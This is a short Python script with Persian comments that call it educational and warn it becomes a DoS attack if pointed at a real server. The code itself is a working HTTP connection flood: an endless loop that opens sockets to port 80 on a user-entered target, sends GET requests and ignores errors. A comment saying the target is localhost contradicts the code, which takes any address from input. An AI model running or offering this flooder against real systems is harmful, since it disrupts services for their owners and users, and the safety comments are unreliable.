# این یک کد آموزشی است - به هیچ وجه نباید اجرا شود
# اگر به جای "127.0.0.1" از IP یک سرور واقعی استفاده کنید و حلقه بی‌نهایت بزنید، حمله DoS می‌شود

import socket

target_ip = input("url?")# لوکال هاست - فقط برای تست روی خودتان
port = 80

while True:   # حلقه بی‌نهایت - همین یک خط کافی است تا سیستم شما را قفل کند
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, port))
        s.send(b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n")
        s.close()
    except:
        pass
